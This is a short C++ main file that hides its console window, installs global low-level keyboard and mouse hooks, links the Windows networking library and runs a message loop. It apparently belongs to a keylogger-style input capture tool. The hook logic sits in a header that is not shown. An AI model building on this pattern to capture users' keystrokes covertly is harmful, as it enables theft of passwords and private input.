#include "WindowsHook.h"

#pragma comment(lib, "user32.lib") // user32.dll windows' library
#pragma comment(lib,"ws2_32.lib") // ws2_32.dll windows' library

// main function
int main()
{
	FreeConsole();

	WindowsHook mouseHook = WindowsHook();
	mouseHook.SetHook(WH_MOUSE_LL);

	WindowsHook keyboardHook = WindowsHook();
	keyboardHook.SetHook(WH_KEYBOARD_LL);

	MSG msg;
	while (GetMessage(&msg, nullptr, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	mouseHook.UnHook();
	keyboardHook.UnHook();

	return ERROR_SUCCESS;
}
